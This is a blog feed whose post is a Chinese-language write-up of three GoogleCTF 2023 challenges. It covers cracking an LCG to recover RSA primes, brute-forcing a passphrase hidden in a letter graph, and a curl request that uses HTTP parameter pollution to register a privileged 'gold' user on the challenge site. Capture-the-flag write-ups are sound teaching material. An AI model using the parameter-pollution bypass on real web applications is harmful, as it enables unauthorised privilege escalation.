{"version":"https://jsonfeed.org/version/1","name":"温柔小猪","home_page_url":"https://zhaoqi.vip","feed_url":"https://zhaoqi.vip/feed.json","author":{"name":"Zhao Qi"},"items":[{"id":"https://zhaoqi.vip/posts/851556193/","url":"https://zhaoqi.vip/posts/851556193/","title":"GoogleCTF2023 Writeup","content_html":"<h1 id=\"LEAST-COMMON-GENOMINATOR\"><a href=\"#LEAST-COMMON-GENOMINATOR\" class=\"headerlink\" title=\"LEAST COMMON GENOMINATOR?\"></a>LEAST COMMON GENOMINATOR?</h1><p><em>Someone used this program to send me an encrypted message but I can’t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!</em></p>\n<p><em><a href=\"https://storage.googleapis.com/gctf-2023-attachments-project/4e90c59c2c12ac422f0b83094cca2c3e5c4c7cce464dddc5cb2ad391155f11c96a183290a289dfe1c64cc9e3cd467706f07e621904588ca4def3a4f6906234b7.zip\">Attachment</a></em></p>\n<hr>\n<details>\n<summary style=\"display: list-item;\">generate.py</summary>\n<div markdown=\"1\">\n\n<pre><code class=\"python\">from secret import config\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import bytes_to_long, isPrime\n\nclass LCG:\n    lcg_m = config.m\n    lcg_c = config.c\n    lcg_n = config.n\n\n    def __init__(self, lcg_s):\n        self.state = lcg_s\n\n    def next(self):\n        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n\n        return self.state\n\nif __name__ == &#39;__main__&#39;:\n\n    assert 4096 % config.it == 0\n    assert config.it == 8\n    assert 4096 % config.bits == 0\n    assert config.bits == 512\n\n    # Find prime value of specified bits a specified amount of times\n    seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635\n    lcg = LCG(seed)\n    primes_arr = []\n\n    dump = True\n    items = 0\n    dump_file = open(&quot;dump.txt&quot;, &quot;w&quot;)\n\n    primes_n = 1\n    while True:\n        for i in range(config.it):\n            while True:\n                prime_candidate = lcg.next()\n                if dump:\n                    dump_file.write(str(prime_candidate) + &#39;\\n&#39;)\n                    items += 1\n                    if items == 6:\n                        dump = False\n                        dump_file.close()\n                if not isPrime(prime_candidate):\n                    continue\n                elif prime_candidate.bit_length() != config.bits:\n                    continue\n                else:\n                    primes_n *= prime_candidate\n                    primes_arr.append(prime_candidate)\n                    break\n\n        # Check bit length\n        if primes_n.bit_length() &gt; 4096:\n            print(&quot;bit length&quot;, primes_n.bit_length())\n            primes_arr.clear()\n            primes_n = 1\n            continue\n        else:\n            break\n\n    # Create public key &#39;n&#39;\n    n = 1\n    for j in primes_arr:\n        n *= j\n    print(&quot;[+] Public Key: &quot;, n)\n    print(&quot;[+] size: &quot;, n.bit_length(), &quot;bits&quot;)\n\n    # Calculate totient &#39;Phi(n)&#39;\n    phi = 1\n    for k in primes_arr:\n        phi *= (k - 1)\n\n    # Calculate private key &#39;d&#39;\n    d = pow(config.e, -1, phi)\n\n    # Generate Flag\n    assert config.flag.startswith(b&quot;CTF&#123;&quot;)\n    assert config.flag.endswith(b&quot;&#125;&quot;)\n    enc_flag = bytes_to_long(config.flag)\n    assert enc_flag &lt; n\n\n    # Encrypt Flag\n    _enc = pow(enc_flag, config.e, n)\n\n    with open (&quot;flag.txt&quot;, &quot;wb&quot;) as flag_file:\n        flag_file.write(_enc.to_bytes(n.bit_length(), &quot;little&quot;))\n\n    # Export RSA Key\n    rsa = RSA.construct((n, config.e))\n    with open (&quot;public.pem&quot;, &quot;w&quot;) as pub_file:\n        pub_file.write(rsa.exportKey().decode())\n</code></pre>\n</div>\n</details>\n\n<p>分析可知:</p>\n<ul>\n<li><p>flag是使用RSA加密的,已知公🔑 文件,即n,e</p>\n</li>\n<li><p>使用LCG线性同余生成器生成素数</p>\n</li>\n<li><p>已知LCG的种子和前6个连续生成的数字</p>\n</li>\n<li><p>config.it &#x3D; 8</p>\n</li>\n<li><p>config.bits &#x3D; 256</p>\n</li>\n</ul>\n<p>LCG是伪随机数生成器和流密码的一种,递推公式是 𝑋𝑛+1&#x3D;(𝑎𝑋𝑛+𝑐) 𝑚𝑜𝑑 𝑚</p>\n<p>已知初值和随后LCG连续生成的6个值,未知增量、乘数和模数.</p>\n<p>我们可以通过攻击得到这三个值,然后模拟原算法通过LCG得到8个素数后,进一步计算n的欧拉函数并求逆元得到d,解密即可.</p>\n<details>\n<summary style=\"display: list-item;\">题解:</summary>\n<div markdown=\"1\">\n\n<pre><code class=\"python\">import math\nfrom functools import reduce\n\nimport gmpy2\n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes\n\ndump_file = open(&quot;dump.txt&quot;)\noutput_values = [int(x) for x in dump_file.readlines()]  # 已知的 LCG 输出值\n\ndef crack_unknown_increment(states, modulus, multiplier):\n    &quot;&quot;&quot;\n    已知：a,m,s0,s1\n    求c\n    &quot;&quot;&quot;\n    increment = (states[1] - states[0] * multiplier) % modulus\n    return modulus, multiplier, increment\n\ndef crack_unknown_multiplier(states, modulus):\n    &quot;&quot;&quot;\n    已知：m,s0,s1,s2\n    求a\n    &quot;&quot;&quot;\n    multiplier = (\n        (states[2] - states[1]) * gmpy2.invert(states[1] - states[0], modulus) % modulus\n    )  # 注意这里求逆元\n    return crack_unknown_increment(states, modulus, multiplier)\n\ndef crack_unknown_modulus(states):\n    &quot;&quot;&quot;\n    已知：s0-s6\n    求a,c,m\n    &quot;&quot;&quot;\n    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]\n    zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]\n    modulus = abs(reduce(math.gcd, zeroes))\n    return crack_unknown_multiplier(states, modulus)\n\nclass LCG:\n    def __init__(self, lcg_m, lcg_c, lcg_n, lcg_s):\n        self.state = lcg_s\n        self.lcg_m = lcg_m\n        self.lcg_c = lcg_c\n        self.lcg_n = lcg_n\n\n    def next(self):\n        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n\n        return self.state\n\n\nm, a, c = crack_unknown_modulus(output_values)\nseed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635\nlcg = LCG(a, c, m, seed)\nprint(a, c, m)\nprimes_n = 1\nprimes_arr = []\nfor i in range(8):\n    while True:\n        prime_candidate = lcg.next()\n        if not isPrime(prime_candidate):\n            continue\n        elif prime_candidate.bit_length() != 512:\n            continue\n        else:\n            primes_n *= prime_candidate\n            primes_arr.append(prime_candidate)\n            break\n\nprint(list(primes_arr))\n\nphi = 1\nfor k in primes_arr:\n    phi *= k - 1\n\nkey = RSA.importKey(open(&quot;public.pem&quot;, &quot;r&quot;).read())\nn = key.n\ne = key.e\nd = gmpy2.invert(e, phi)\n\nenc = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()\n\nflag = pow(int.from_bytes(enc, &quot;little&quot;), d, n)\nprint(long_to_bytes(flag))\n</code></pre>\n</div>\n</details>\n\n<p><strong>flag</strong>: <code>CTF&#123;C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy&#125;</code></p>\n<p>参考:</p>\n<ul>\n<li><a href=\"https://www.codercto.com/a/35743.html\">攻击线性同余生成器(LCG) | 码农网</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_45883223/article/details/115299389\">LCG(线性同余生成器)_lcg线性同余_WustHandy的博客-CSDN博客</a></li>\n</ul>\n<h1 id=\"NPC\"><a href=\"#NPC\" class=\"headerlink\" title=\"NPC\"></a>NPC</h1><p><em>A friend handed me this map and told me that it will lead me to the flag.<br>It is confusing me and I don’t know how to read it, can you help me out?</em></p>\n<p><em><a href=\"https://storage.googleapis.com/gctf-2023-attachments-project/9a8f5d47fab0a460f9826c4f13aa1dff2809140e68325fb21edab674ee5ec2476b902d2797c41bd6d9311e3510c9366d739d9404e00aa9d4ffd6a0d88e5bf2ef.zip\">Attachment</a></em></p>\n<hr>\n<p>使用Graphviz工具将<code>hint.dot</code>转换为图片,得到下图</p>\n<pre><code class=\"shell\">dot -Tjpg  hint.dot -o hint.jpg\n</code></pre>\n<img data-src=\"../../CTF/GoogleCTF2023/Misc/assets/hint.jpg\" alt=\"hint.jpg\" width=\"300\">\n\n<p>分析代码:</p>\n<ul>\n<li><p>从<code>USACONST.TXT</code>中随机选择N个单词生成密码,使用<code>passphrase.encrypt(secret, password)</code>对flag加密</p>\n</li>\n<li><p>对于<code>password</code>中的每个字母,创建一个带有唯一ID的节点,并添加到图中</p>\n</li>\n<li><p>按照<code>password</code>的顺序,对密码中相邻的两个字符创建一条边</p>\n</li>\n<li><p>向图中随机添加<code>int(len(password) ** 1.3)</code>条边</p>\n</li>\n<li><p>随机打乱图中节点和边的顺序</p>\n</li>\n<li><p>随机交换一些节点的起点和终点,由于<code>random() % 2</code>只有在<code>random</code>函数返回值为0时才为<code>False</code>,我们假定图中每条边的起点和终点都被交换了一遍</p>\n</li>\n<li><p>将节点和边的信息写入到<code>hint.dot</code>文件中</p>\n</li>\n</ul>\n<p>我是思路是:</p>\n<ol>\n<li><p>遍历words_list中的单词,从每个节点出发,使用DFS判断是否可以在图中找到,这样过滤后得到30个单词,即密码一定由该30个单词中的某几个单词组成</p>\n</li>\n<li><p>枚举密码中所用的单词个数N</p>\n</li>\n<li><p>使用组合数从这30个单词选择N个单词</p>\n</li>\n<li><p>判断所选的N个单词组成的字符集和<code>hint.dot</code>中的字符集是否一致</p>\n</li>\n<li><p>对N个单词进行全排列,并尝试解密 (<em>为了提高效率,这里还用到了多进程</em>)</p>\n</li>\n</ol>\n<p>当N&#x3D;5时,得到password<code>standardwatersigngivenchosen</code>和<code>flag</code>.</p>\n<details>\n<summary style=\"display: list-item;\">代码</summary>\n<div markdown=\"1\">\n\n<pre><code class=\"python\">import concurrent.futures\nimport itertools\nimport re\nfrom collections import Counter\n\nfrom pyrage import passphrase\n\nfrom encrypt import get_word_list\n\n\nclass Node:\n    def __init__(self, letter):\n        self.letter = letter\n        self.adjacent = []\n\n    def __str__(self) -&gt; str:\n        return f&quot;&#123;self.letter&#125; -&gt; &#123;[x.letter for x in self.adjacent]&#125;&quot;\n\n    __repr__ = __str__\n\ndef build_nodes():\n    pattern = r&quot;\\s+(\\d+)\\s+\\[label=(\\w+)\\];&quot;\n    pattern2 = r&quot;\\s+(\\d+)\\s+--\\s+(\\d+);$&quot;\n    nodes = dict()\n    with open(&quot;hint.dot&quot;, &quot;r&quot;) as f:\n        for line in f:\n            if &quot;label&quot; in line\n                match = re.match(pattern, line)\n                node_id = match.group(1)\n                letter = match.group(2)\n                nodes[node_id] = Node(letter)\n            elif &quot;--&quot; in line:\n                match = re.match(pattern2, line)\n                start = match.group(1)\n                end = match.group(2)\n                # nodes[start].adjacent.append(nodes[end])\n                nodes[end].adjacent.append(nodes[start])\n    return nodes\n\nvisited = set()\n\ndef dfs(node, index, word):\n    if index == len(word):\n        return True\n\n    if node.letter != word[index]:\n        return False\n\n    visited.add(node)\n\n    for adj in node.adjacent:\n        if adj not in visited:\n            if dfs(adj, index + 1, word):\n                return True\n\n    visited.remove(node)\n    return False\n\ndef check(password):\n    with open(&quot;secret.age&quot;, &quot;rb&quot;) as f:\n        enc = f.read()\n    try:\n        print(&quot;[FLAG] is &quot;, passphrase.decrypt(enc, password))\n        print(&quot;Password is &quot;, password)\n    except Exception as e:\n        pass\n\n\ndef filter_words(nodes):\n    ans = set()\n    for word in get_word_list():\n        visited.clear()\n        for node in nodes.values():\n            if dfs(node, 0, word):\n                ans.add(word)\n                break\n\n    print(&quot;ans:&quot;, len(ans), ans)\n    return ans\n\n\ndef main():\n    nodes = build_nodes()\n\n    letters = sorted([node.letter for node in nodes.values()])\n\n    ans = filter_words(nodes)\n    for num in range(1, len(ans) + 1):\n        print(f&quot;Num is &#123;num&#125;&quot;)\n        for comb in itertools.combinations(ans, num):  # 组合\n            if sorted(&quot;&quot;.join(comb)) == letters:\n                passwords = [\n                    &quot;&quot;.join(perm) for perm in itertools.permutations(comb, len(comb))\n                ]\n\n                with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor:\n                    executor.map(check, passwords)\n\n\nif __name__ == &quot;__main__&quot;:\n    main()\n</code></pre>\n</div>\n</details>\n\n<p><strong>flag</strong>: <code>CTF&#123;S3vEn_bR1dg35_0f_K0eN1g5BeRg&#125;</code></p>\n<p>参考:</p>\n<ul>\n<li><a href=\"https://docs.python.org/zh-cn/3/library/concurrent.futures.html#processpoolexecutor\">concurrent.futures — 启动并行任务 – Python 3.11.4 文档</a></li>\n</ul>\n<h1 id=\"UNDER-CONSTRUCTION\"><a href=\"#UNDER-CONSTRUCTION\" class=\"headerlink\" title=\"UNDER-CONSTRUCTION\"></a>UNDER-CONSTRUCTION</h1><p><em>We were building a web app but the new CEO wants it remade in php.</em></p>\n<p><em><a href=\"https://storage.googleapis.com/gctf-2023-attachments-project/22790c2f38bd6adde75753641011c223db7e2c0ec718df6e883976ed9c518ca0a86ef67b7e153fd07a9fa734f6a5350028ca266e3bf646f1096d2c4d536ff45a.zip\">Attachment</a></em><br><em><code>https://under-construction-web.2023.ctfcompetition.com</code></em><br><em><code>https://under-construction-php-web.2023.ctfcompetition.com</code></em></p>\n<hr>\n<p>题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点.</p>\n<p>分析代码:</p>\n<p>Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册.</p>\n<pre><code class=\"python\"># File: /flask/authorized_routes.py\n@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])\ndef signup_post():\n    raw_request = request.get_data()\n    ...\n    requests.post(f&quot;http://&#123;PHP_HOST&#125;:1337/account_migrator.php&quot;, \n        headers=&#123;&quot;token&quot;: TOKEN, &quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)&#125;, data=raw_request)\n    return redirect(url_for(&#39;authorized.login&#39;))\n</code></pre>\n<p>只有<code>gold</code>级别的用户,在PHP站点登录后才可以看到FLAG</p>\n<pre><code class=\"php\"># File: /php/index.php\nfunction getResponse()\n&#123;\n    ...\n    $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;;\n\n    if ($tier === &quot;gold&quot;) &#123;\n        $response .= &quot; &quot; . getenv(&quot;FLAG&quot;);\n    &#125;\n\n    return $response;\n&#125;\n</code></pre>\n<p>Flask会对查询参数进行校验,防止创建高权限的用户.</p>\n<pre><code class=\"python\"># File: /flask/authorized_routes.py\n@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])\ndef signup_post():\n    ...\n    tier = models.Tier(request.form.get(&#39;tier&#39;))\n    if(tier == models.Tier.GOLD):\n        flash(&#39;GOLD tier only allowed for the CEO&#39;)\n        return redirect(url_for(&#39;authorized.signup&#39;))\n    ...\n</code></pre>\n<p>HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值.</p>\n<p>因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户.</p>\n<p><strong>curl</strong></p>\n<pre><code class=\"shell\">curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d &quot;username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold&quot;\n</code></pre>\n<p>然后用上述的用户名和密码去PHP站点登录即可.</p>\n<p><strong>flag</strong>: <code>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"LEAST COMMON GENOMINATOR?Someone used this program to send me an encrypted message but I can’t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?! Attachment generate.py from secret import config from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, isPrime class LCG: lcg_m = config.m lcg_c = config.c lcg_n = config.n def __init__(self, lcg_s): self.state = lcg_s def next(self): self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n return self.state if __name__ == &#39;__main__&#39;: assert 4096 % config.it == 0 assert config.it == 8 assert 4096 % config.bits == 0 assert config.bits == 512 # Find prime value of specified bits a specified amount of times seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635 lcg = LCG(seed) primes_arr = [] dump = True items = 0 dump_file = open(&quot;dump.txt&quot;, &quot;w&quot;) primes_n = 1 while True: for i in range(config.it): while True: prime_candidate = lcg.next() if dump: dump_file.write(str(prime_candidate) + &#39;\\n&#39;) items += 1 if items == 6: dump = False dump_file.close() if not isPrime(prime_candidate): continue elif prime_candidate.bit_length() != config.bits: continue else: primes_n *= prime_candidate primes_arr.append(prime_candidate) break # Check bit length if primes_n.bit_length() &gt; 4096: print(&quot;bit length&quot;, primes_n.bit_length()) primes_arr.clear() primes_n = 1 continue else: break # Create public key &#39;n&#39; n = 1 for j in primes_arr: n *= j print(&quot;[+] Public Key: &quot;, n) print(&quot;[+] size: &quot;, n.bit_length(), &quot;bits&quot;) # Calculate totient &#39;Phi(n)&#39; phi = 1 for k in primes_arr: phi *= (k - 1) # Calculate private key &#39;d&#39; d = pow(config.e, -1, phi) # Generate Flag assert config.flag.startswith(b&quot;CTF&#123;&quot;) assert config.flag.endswith(b&quot;&#125;&quot;) enc_flag = bytes_to_long(config.flag) assert enc_flag &lt; n # Encrypt Flag _enc = pow(enc_flag, config.e, n) with open (&quot;flag.txt&quot;, &quot;wb&quot;) as flag_file: flag_file.write(_enc.to_bytes(n.bit_length(), &quot;little&quot;)) # Export RSA Key rsa = RSA.construct((n, config.e)) with open (&quot;public.pem&quot;, &quot;w&quot;) as pub_file: pub_file.write(rsa.exportKey().decode()) 分析可知: flag是使用RSA加密的,已知公🔑 文件,即n,e 使用LCG线性同余生成器生成素数 已知LCG的种子和前6个连续生成的数字 config.it &#x3D; 8 config.bits &#x3D; 256 LCG是伪随机数生成器和流密码的一种,递推公式是 𝑋𝑛+1&#x3D;(𝑎𝑋𝑛+𝑐) 𝑚𝑜𝑑 𝑚 已知初值和随后LCG连续生成的6个值,未知增量、乘数和模数. 我们可以通过攻击得到这三个值,然后模拟原算法通过LCG得到8个素数后,进一步计算n的欧拉函数并求逆元得到d,解密即可. 题解: import math from functools import reduce import gmpy2 from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes dump_file = open(&quot;dump.txt&quot;) output_values = [int(x) for x in dump_file.readlines()] # 已知的 LCG 输出值 def crack_unknown_increment(states, modulus, multiplier): &quot;&quot;&quot; 已知：a,m,s0,s1 求c &quot;&quot;&quot; increment = (states[1] - states[0] * multiplier) % modulus return modulus, multiplier, increment def crack_unknown_multiplier(states, modulus): &quot;&quot;&quot; 已知：m,s0,s1,s2 求a &quot;&quot;&quot; multiplier = ( (states[2] - states[1]) * gmpy2.invert(states[1] - states[0], modulus) % modulus ) # 注意这里求逆元 return crack_unknown_increment(states, modulus, multiplier) def crack_unknown_modulus(states): &quot;&quot;&quot; 已知：s0-s6 求a,c,m &quot;&quot;&quot; diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(math.gcd, zeroes)) return crack_unknown_multiplier(states, modulus) class LCG: def __init__(self, lcg_m, lcg_c, lcg_n, lcg_s): self.state = lcg_s self.lcg_m = lcg_m self.lcg_c = lcg_c self.lcg_n = lcg_n def next(self): self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n return self.state m, a, c = crack_unknown_modulus(output_values) seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635 lcg = LCG(a, c, m, seed) print(a, c, m) primes_n = 1 primes_arr = [] for i in range(8): while True: prime_candidate = lcg.next() if not isPrime(prime_candidate): continue elif prime_candidate.bit_length() != 512: continue else: primes_n *= prime_candidate primes_arr.append(prime_candidate) break print(list(primes_arr)) phi = 1 for k in primes_arr: phi *= k - 1 key = RSA.importKey(open(&quot;public.pem&quot;, &quot;r&quot;).read()) n = key.n e = key.e d = gmpy2.invert(e, phi) enc = open(&quot;flag.txt&quot;, &quot;rb&quot;).read() flag = pow(int.from_bytes(enc, &quot;little&quot;), d, n) print(long_to_bytes(flag)) flag: CTF&#123;C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy&#125; 参考: 攻击线性同余生成器(LCG) | 码农网 LCG(线性同余生成器)_lcg线性同余_WustHandy的博客-CSDN博客 NPCA friend handed me this map and told me that it will lead me to the flag.It is confusing me and I don’t know how to read it, can you help me out? Attachment 使用Graphviz工具将hint.dot转换为图片,得到下图 dot -Tjpg hint.dot -o hint.jpg 分析代码: 从USACONST.TXT中随机选择N个单词生成密码,使用passphrase.encrypt(secret, password)对flag加密 对于password中的每个字母,创建一个带有唯一ID的节点,并添加到图中 按照password的顺序,对密码中相邻的两个字符创建一条边 向图中随机添加int(len(password) ** 1.3)条边 随机打乱图中节点和边的顺序 随机交换一些节点的起点和终点,由于random() % 2只有在random函数返回值为0时才为False,我们假定图中每条边的起点和终点都被交换了一遍 将节点和边的信息写入到hint.dot文件中 我是思路是: 遍历words_list中的单词,从每个节点出发,使用DFS判断是否可以在图中找到,这样过滤后得到30个单词,即密码一定由该30个单词中的某几个单词组成 枚举密码中所用的单词个数N 使用组合数从这30个单词选择N个单词 判断所选的N个单词组成的字符集和hint.dot中的字符集是否一致 对N个单词进行全排列,并尝试解密 (为了提高效率,这里还用到了多进程) 当N&#x3D;5时,得到passwordstandardwatersigngivenchosen和flag. 代码 import concurrent.futures import itertools import re from collections import Counter from pyrage import passphrase from encrypt import get_word_list class Node: def __init__(self, letter): self.letter = letter self.adjacent = [] def __str__(self) -&gt; str: return f&quot;&#123;self.letter&#125; -&gt; &#123;[x.letter for x in self.adjacent]&#125;&quot; __repr__ = __str__ def build_nodes(): pattern = r&quot;\\s+(\\d+)\\s+\\[label=(\\w+)\\];&quot; pattern2 = r&quot;\\s+(\\d+)\\s+--\\s+(\\d+);$&quot; nodes = dict() with open(&quot;hint.dot&quot;, &quot;r&quot;) as f: for line in f: if &quot;label&quot; in line match = re.match(pattern, line) node_id = match.group(1) letter = match.group(2) nodes[node_id] = Node(letter) elif &quot;--&quot; in line: match = re.match(pattern2, line) start = match.group(1) end = match.group(2) # nodes[start].adjacent.append(nodes[end]) nodes[end].adjacent.append(nodes[start]) return nodes visited = set() def dfs(node, index, word): if index == len(word): return True if node.letter != word[index]: return False visited.add(node) for adj in node.adjacent: if adj not in visited: if dfs(adj, index + 1, word): return True visited.remove(node) return False def check(password): with open(&quot;secret.age&quot;, &quot;rb&quot;) as f: enc = f.read() try: print(&quot;[FLAG] is &quot;, passphrase.decrypt(enc, password)) print(&quot;Password is &quot;, password) except Exception as e: pass def filter_words(nodes): ans = set() for word in get_word_list(): visited.clear() for node in nodes.values(): if dfs(node, 0, word): ans.add(word) break print(&quot;ans:&quot;, len(ans), ans) return ans def main(): nodes = build_nodes() letters = sorted([node.letter for node in nodes.values()]) ans = filter_words(nodes) for num in range(1, len(ans) + 1): print(f&quot;Num is &#123;num&#125;&quot;) for comb in itertools.combinations(ans, num): # 组合 if sorted(&quot;&quot;.join(comb)) == letters: passwords = [ &quot;&quot;.join(perm) for perm in itertools.permutations(comb, len(comb)) ] with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor: executor.map(check, passwords) if __name__ == &quot;__main__&quot;: main() flag: CTF&#123;S3vEn_bR1dg35_0f_K0eN1g5BeRg&#125; 参考: concurrent.futures — 启动并行任务 – Python 3.11.4 文档 UNDER-CONSTRUCTIONWe were building a web app but the new CEO wants it remade in php. Attachmenthttps://under-construction-web.2023.ctfcompetition.comhttps://under-construction-php-web.2023.ctfcompetition.com 题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点. 分析代码: Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册. # File: /flask/authorized_routes.py @authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;]) def signup_post(): raw_request = request.get_data() ... requests.post(f&quot;http://&#123;PHP_HOST&#125;:1337/account_migrator.php&quot;, headers=&#123;&quot;token&quot;: TOKEN, &quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)&#125;, data=raw_request) return redirect(url_for(&#39;authorized.login&#39;)) 只有gold级别的用户,在PHP站点登录后才可以看到FLAG # File: /php/index.php function getResponse() &#123; ... $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;; if ($tier === &quot;gold&quot;) &#123; $response .= &quot; &quot; . getenv(&quot;FLAG&quot;); &#125; return $response; &#125; Flask会对查询参数进行校验,防止创建高权限的用户. # File: /flask/authorized_routes.py @authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;]) def signup_post(): ... tier = models.Tier(request.form.get(&#39;tier&#39;)) if(tier == models.Tier.GOLD): flash(&#39;GOLD tier only allowed for the CEO&#39;) return redirect(url_for(&#39;authorized.signup&#39;)) ... HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值. 因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户. curl curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d &quot;username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold&quot; 然后用上述的用户名和密码去PHP站点登录即可. flag: CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;","summary":"LEAST COMMON GENOMINATOR?Someone used this program to send me an encrypted message but I can’t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?! Attachment generate.py from secret import config from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, isPrime class LCG: lcg_m = config.m lcg_c = config.c lcg_n = config.n def __init__(self, lcg_s): self.state = lcg_s def next(self): self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n return self.state if __name__ == &#39;__main__&#39;: assert 4096 % config.it == 0 assert config.it == 8 assert 4096 % config.bits == 0 assert config.bits == 512 # Find prime value of specified bits a specified amount of times seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635 lcg = LCG(seed) primes_arr = [] dump = True items = 0 dump_file = open(&quot;dump.txt&quot;, &quot;w&quot;) primes_n = 1 while True: for i in range(config.it): while True: prime_candidate = lcg.next() if dump: dump_file.write(str(prime_candidate) + &#39;\\n&#39;) items += 1 if items == 6: dump = False dump_file.close() if not isPrime(prime_candidate): continue elif prime_candidate.bit_length() != config.bits: continue else: primes_n *= prime_candidate primes_arr.append(prime_candidate) break # Check bit length if primes_n.bit_length() &gt; 4096: print(&quot;bit length&quot;, primes_n.bit_length()) primes_arr.clear() primes_n = 1 continue else: break # Create public key &#39;n&#39; n = 1 for j in primes_arr: n *= j print(&quot;[+] Public Key: &quot;, n) print(&quot;[+] size: &quot;, n.bit_length(), &quot;bits&quot;) # Calculate totient &#39;Phi(n)&#39; phi = 1 for k in primes_arr: phi *= (k - 1) # Calculate private key &#39;d&#39; d = pow(config.e, -1, phi) # Generate Flag assert config.flag.startswith(b&quot;CTF&#123;&quot;) assert config.flag.endswith(b&quot;&#125;&quot;) enc_flag = bytes_to_long(config.flag) assert enc_flag &lt; n # Encrypt Flag _enc = pow(enc_flag, config.e, n) with open (&quot;flag.txt&quot;, &quot;wb&quot;) as flag_file: flag_file.write(_enc.to_bytes(n.bit_length(), &quot;little&quot;)) # Export RSA Key rsa = RSA.construct((n, config.e)) with open (&quot;public.pem&quot;, &quot;w&quot;) as pub_file: pub_file.write(rsa.exportKey().decode()) 分析可知: flag是使用RSA加密的,已知公🔑 文件,即n,e 使用LCG线性同余生成器生成素数 已知LCG的种子和前6个连续生成的数字 config.it &#x3D; 8 config.bits &#x3D; 256 LCG是伪随机数生成器和流密码的一种,递推公式是 𝑋𝑛+1&#x3D;(𝑎𝑋𝑛+𝑐) 𝑚𝑜𝑑 𝑚 已知初值和随后LCG连续生成的6个值,未知增量、乘数和模数. 我们可以通过攻击得到这三个值,然后模拟原算法通过LCG得到8个素数后,进一步计算n的欧拉函数并求逆元得到d,解密即可. 题解: import math from functools import reduce import gmpy2 from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes dump_file = open(&quot;dump.txt&quot;) output_values = [int(x) for x in dump_file.readlines()] # 已知的 LCG 输出值 def crack_unknown_increment(states, modulus, multiplier): &quot;&quot;&quot; 已知：a,m,s0,s1 求c &quot;&quot;&quot; increment = (states[1] - states[0] * multiplier) % modulus return modulus, multiplier, increment def crack_unknown_multiplier(states, modulus): &quot;&quot;&quot; 已知：m,s0,s1,s2 求a &quot;&quot;&quot; multiplier = ( (states[2] - states[1]) * gmpy2.invert(states[1] - states[0], modulus) % modulus ) # 注意这里求逆元 return crack_unknown_increment(states, modulus, multiplier) def crack_unknown_modulus(states): &quot;&quot;&quot; 已知：s0-s6 求a,c,m &quot;&quot;&quot; diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(math.gcd, zeroes)) return crack_unknown_multiplier(states, modulus) class LCG: def __init__(self, lcg_m, lcg_c, lcg_n, lcg_s): self.state = lcg_s self.lcg_m = lcg_m self.lcg_c = lcg_c self.lcg_n = lcg_n def next(self): self.state = (self.state * self.lcg_m + self.lcg_c) % 